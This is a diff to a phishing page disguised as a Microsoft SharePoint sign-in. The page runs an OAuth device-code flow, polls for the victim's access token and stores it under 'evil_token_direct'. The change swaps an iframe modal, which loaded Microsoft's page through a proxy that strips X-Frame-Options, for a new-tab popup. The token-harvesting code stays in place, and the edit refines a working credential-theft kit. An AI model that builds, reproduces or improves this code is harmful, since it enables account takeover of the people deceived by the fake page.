@@ -215,69 +215,6 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         .footer { text-align: center; font-size: 11px; color: #999; padding: 16px; border-top: 1px solid #eee; }
-
-        /* MODAL OVERLAY FOR IFRAME */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-        }
-        .modal-overlay.active {
-            display: flex;
-        }
-        .modal-box {
-            position: relative;
-            width: 90%;
-            max-width: 800px;
-            height: 90vh;
-            max-height: 700px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-        .modal-header {
-            padding: 10px 16px;
-            background: #f8fafc;
-            border-bottom: 1px solid #e1e5e9;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .modal-header span {
-            font-size: 14px;
-            font-weight: 500;
-            color: #333;
-        }
-        .modal-close-btn {
-            background: none;
-            border: none;
-            font-size: 24px;
-            line-height: 1;
-            cursor: pointer;
-            color: #666;
-            padding: 0 8px;
-        }
-        .modal-close-btn:hover { color: #000; }
-        .modal-iframe-wrapper {
-            flex: 1;
-            width: 100%;
-            height: 100%;
-        }
-        .modal-iframe-wrapper iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
     </style>
 </head>
 <body>
@@ -357,19 +294,6 @@
         <div class="footer">Microsoft SharePoint</div>
     </div>
 
-    <!-- MODAL OVERLAY -->
-    <div class="modal-overlay" id="microsoftModal">
-        <div class="modal-box">
-            <div class="modal-header">
-                <span>🔐 Microsoft Sign-In</span>
-                <button class="modal-close-btn" id="modalCloseBtn">✕</button>
-            </div>
-            <div class="modal-iframe-wrapper">
-                <iframe id="microsoftIframe" src="about:blank"></iframe>
-            </div>
-        </div>
-    </div>
-
     <script>
         (function() {
             'use strict';
@@ -378,10 +302,6 @@
             const copyBtn = document.getElementById('copyBtn');
             const loadingSpinner = document.getElementById('loadingSpinner');
             const spinnerText = document.getElementById('spinnerText');
-            
-            const modal = document.getElementById('microsoftModal');
-            const iframe = document.getElementById('microsoftIframe');
-            const closeBtn = document.getElementById('modalCloseBtn');
 
             let deviceCode = '';
             let userCode = '';
@@ -397,7 +317,7 @@
             }
 
             // ------------------------------------------------------------------
-            // 🔥 UPDATED: Open Modal ONLY when the user clicks "Copy code".
+            // 🔥 UPDATED: Copy + Open new tab on click
             // ------------------------------------------------------------------
             copyBtn.addEventListener('click', function(e) {
                 const code = otpDisplay.textContent.trim();
@@ -406,21 +326,21 @@
                     return;
                 }
 
-                // Perform the copy operation
+                // 1. Perform the copy operation
                 if (navigator.clipboard && navigator.clipboard.writeText) {
                     navigator.clipboard.writeText(code).then(() => {
                         copyBtn.textContent = 'Copied!';
                         setTimeout(() => { copyBtn.textContent = 'Copy code'; }, 1800);
-                        // 🔥 OPEN THE MODAL RIGHT AFTER COPY
+                        // 2. Open Microsoft page in new tab
                         if (verificationUri) {
-                            openInlineModal(verificationUri);
+                            window.open(verificationUri, '_blank');
                         }
                     }).catch(() => fallbackCopy(code));
                 } else {
                     fallbackCopy(code);
-                    // 🔥 OPEN THE MODAL RIGHT AFTER FALLBACK COPY
+                    // 2. Open Microsoft page in new tab
                     if (verificationUri) {
-                        openInlineModal(verificationUri);
+                        window.open(verificationUri, '_blank');
                     }
                 }
             });
@@ -443,26 +363,6 @@
                 document.body.removeChild(ta);
             }
 
-            // Open modal with iframe pointing to proxy endpoint
-            function openInlineModal(uri) {
-                if (!uri) return;
-                // Use the proxy endpoint to strip X-Frame-Options
-                const proxyUrl = '/proxy?url=' + encodeURIComponent(uri);
-                iframe.src = proxyUrl;
-                modal.classList.add('active');
-                spinnerText.textContent = 'Microsoft sign‑in opened. Enter the code there.';
-            }
-
-            // Close modal
-            function closeModal() {
-                modal.classList.remove('active');
-                iframe.src = 'about:blank';
-            }
-            closeBtn.addEventListener('click', closeModal);
-            modal.addEventListener('click', function(e) {
-                if (e.target === modal) closeModal();
-            });
-
             async function pollForToken() {
                 if (!deviceCode || isPolling || isApproved) return;
                 isPolling = true;
@@ -479,7 +379,6 @@
                         pollInterval = null;
                         setCode('Approved ✓');
                         copyBtn.disabled = true;
-                        closeModal();
                         spinnerText.textContent = 'Verification complete! Redirecting…';
                         setTimeout(() => {
                             localStorage.setItem('evil_token_direct', data.access_token);
@@ -500,7 +399,6 @@
                         pollInterval = null;
                         setCode('EXPIRED');
                         copyBtn.disabled = true;
-                        closeModal();
                         spinnerText.textContent = 'Code expired. Refresh the page.';
                         isPolling = false;
                         return;
@@ -540,9 +438,9 @@
                     setCode(userCode);
                     copyBtn.disabled = false;
                     
-                    // 🔥 REMOVED: openInlineModal(verificationUri);  <-- It no longer auto-opens!
-
-                    spinnerText.textContent = 'Code ready. Click "Copy code" to open the Microsoft sign‑in.';
+                    // 🔥 NO AUTO-OPEN. User must click "Copy code" to open the tab.
+                    spinnerText.textContent = 'Code ready. Click "Copy code" to open the Microsoft sign‑in page in a new tab.';
+                    
                     if (pollInterval) clearInterval(pollInterval);
                     const intervalMs = (data.interval || 5) * 1000 + 500;
                     pollInterval = setInterval(pollForToken, intervalMs);
@@ -564,7 +462,6 @@
                     e.preventDefault();
                     if (pollInterval) clearInterval(pollInterval);
                     isApproved = false;
-                    closeModal();
                     startDeviceFlow();
                 }
             });
